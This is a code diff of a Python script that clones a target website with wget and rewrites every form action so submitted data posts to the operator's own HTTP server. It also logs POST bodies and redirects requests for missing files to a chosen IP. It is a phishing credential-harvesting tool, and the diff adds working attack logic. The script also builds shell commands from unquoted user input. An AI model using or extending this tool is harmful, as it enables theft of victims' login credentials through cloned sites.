@@ -25,36 +25,41 @@ POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
 DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
 PORT = 80
 
-#################
-###   INPUT   ###
-#################
+############################
+###   INPUT & WEB CRAWL  ###
+############################
 
 os.system("clear")
 print(BANNER)
 
 # TODO : Add option to download webpage manually
 
-url = input("What is the FULL URL you want to copy : ")
-
-redirect_ip = input("What is the IP you want to redirect to : ")
+redirect_ip = input("[*] What is the IP you want to redirect to : ")
 
 yes = {'yes','y', 'ye'}
-user_agent_change = input("Change default user agent? (y/N) : ")
-if user_agent_change.lower() in yes:
-    user_agent = input("User agent : ")
+no = {'no', 'n'}
+
+use_wget = input("[*] Do you want to automatically download the page with wget? (Y/n) : ")
+
+if use_wget.lower() not in no:
+    url = input("[*] What is the FULL URL you want to copy : ")
+
+    user_agent_change = input("Change default user agent? (y/N) : ")
+    
+    if user_agent_change.lower() in yes:
+        user_agent = input("User agent : ")
+    else:
+        user_agent = DEFAULT_USER_AGENT
+
+    print("\n[*] Downloading web page with wget ...")
+
+    # Use wget command to download
+    os.system("wget -E -H -k -K -p -nH --cut-dirs=100 -nv {} --user-agent {} --directory-prefix={}".format(url, user_agent, WEB_PATH))
+
+    print("[*] Done.\n")
+
 else:
-    user_agent = DEFAULT_USER_AGENT
-
-###################
-###  WEB CRAWL  ###
-###################
-
-print("\n[*] Downloading web page with wget ...")
-
-# Use wget command to download
-os.system("wget -E -H -k -K -p -nH -nv {} --user-agent {} --directory-prefix={}".format(url, user_agent, WEB_PATH))
-
-print("[*] Done.\n")
+    print("[*] Make sure all the proper files are in /web before launching the HTTP server !")
 
 # Make sure index.html exists
 
@@ -82,14 +87,16 @@ html_as_str = open(INDEX_PATH, 'r').read()
 
 # Yes, I do in fact parse HTML with Regex, I know.
 
-forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'
-html_as_str = re.sub(forms_pattern, r'\1\\\3', html_as_str)
+forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'     # Regex pattern
+html_as_str = re.sub(forms_pattern, r'\1\\\3', html_as_str) # Make sure that all <form> POST action is directed to us
 
 with open(INDEX_PATH, 'wb') as file:
     file.write(str.encode(html_as_str))
 
 
 print("[*] Done.")
+
+input("[*] Press ENTER to start the HTTP server ...")
 
 ######################
 ###   HTTP Server  ###
@@ -99,10 +106,19 @@ print("[*] Done.")
 class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         print("[*] GET request received!")
-        f = self.send_head()
-        if f:
-            self.copyfile(f, self.wfile)
-            f.close()
+
+        if os.path.exists(self.translate_path(self.path)):                      # Check if we have the requested file
+            f = self.send_head()                                                # Send headers
+            if f:
+                self.copyfile(f, self.wfile)                                    # Write file to wfile stream
+                f.close()
+        else:                                                                   # If we don't have the requested file
+            print("[*] Error : File {} is non-existant!".format(self.path))
+            print("[*] Returning HTTP 303 response code ...")   
+            remote_path = "http://{}{}".format(redirect_ip, self.path)          # http:// + ip + path
+            self.send_response(303)                                             # Send HTTP 303 
+            self.send_header("Location", remote_path)                           # Set Location in header to the remote path, if the file doesn't exist there, that server will return a 404
+            self.end_headers() 
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])            # Get length of POST body
@@ -130,4 +146,5 @@ except KeyboardInterrupt as error:
     print("\n[*] KeyboardInterrupt ...")
     httpd.server_close()
     print("\n[*] Server on port {} was shut down successfully.\n".format(PORT))
+    print("[*] Please run cleanup.py before running this script again!\n")
     print(error)
